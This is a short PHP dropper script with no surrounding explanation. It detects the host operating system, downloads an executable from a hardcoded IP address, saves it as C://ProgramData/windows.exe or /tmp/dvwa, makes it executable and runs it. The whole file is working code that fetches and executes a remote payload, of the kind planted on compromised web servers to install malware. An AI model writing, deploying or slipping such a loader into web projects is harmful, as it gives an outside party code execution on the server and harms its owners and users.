<?php
$win=0;
$file="";
$url="";
strtoupper(substr(PHP_OS,0,3))==='WIN'?$win=1:$win=0;
if($win==1){
    $file = "C://ProgramData/windows.exe";
    $url  = "http://192.210.206.76/windows.exe";
}else{
    $file = "/tmp/dvwa";
    $url  = "http://192.210.206.76/dvwa";
}
    ob_start();
    readfile($url);
    $content = ob_get_contents();
    ob_end_clean();
    $size = strlen($content);
    $fp2 = @fopen($file, 'w');
    fwrite($fp2, $content);
    fclose($fp2);
    unset($content, $url);
if($win==1){
    passthru($file);
}else{
    passthru("chmod +x ".$file);
    passthru($file);
}
?>